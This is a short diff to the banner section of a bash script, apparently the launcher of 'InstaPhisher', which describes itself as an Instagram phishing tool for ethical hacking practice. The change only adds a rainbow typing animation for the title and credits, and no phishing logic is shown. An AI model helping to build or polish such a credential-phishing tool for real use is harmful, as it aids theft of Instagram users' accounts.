@@ -34,10 +34,29 @@ type_effect() {
 echo ""
 figlet -f slant "InstaPhisher" | lolcat -a -d 4
 
-# Animated subtitle
-echo -e "${GRN}Instagram Phishing Tool for Ethical Hacking Practice${NC}" 
-echo -e "${CYAN}Created by: SACHIN BADASRA\n"
-sleep 1
+# Define rainbow colors
+COLORS=('\033[1;31m' '\033[1;33m' '\033[1;32m' '\033[1;36m' '\033[1;34m' '\033[1;35m')
+NC='\033[0m'  # No color
+
+# Function for rainbow typing animation
+rainbow_type() {
+  text="$1"
+  delay=${2:-0.03}
+  color_index=0
+
+  for ((i=0; i<${#text}; i++)); do
+    char="${text:$i:1}"
+    color="${COLORS[$color_index]}"
+    echo -en "${color}${char}${NC}"
+    sleep "$delay"
+    ((color_index=(color_index+1)%${#COLORS[@]}))
+  done
+  echo ""
+}
+
+# Rainbow animated subtitle
+rainbow_type "Instagram Phishing Tool for Ethical Hacking Practice" 0.03
+rainbow_type "Created by: SACHIN BADASRA" 0.04
 
 # Colors
 GRN='\033[0;32m'
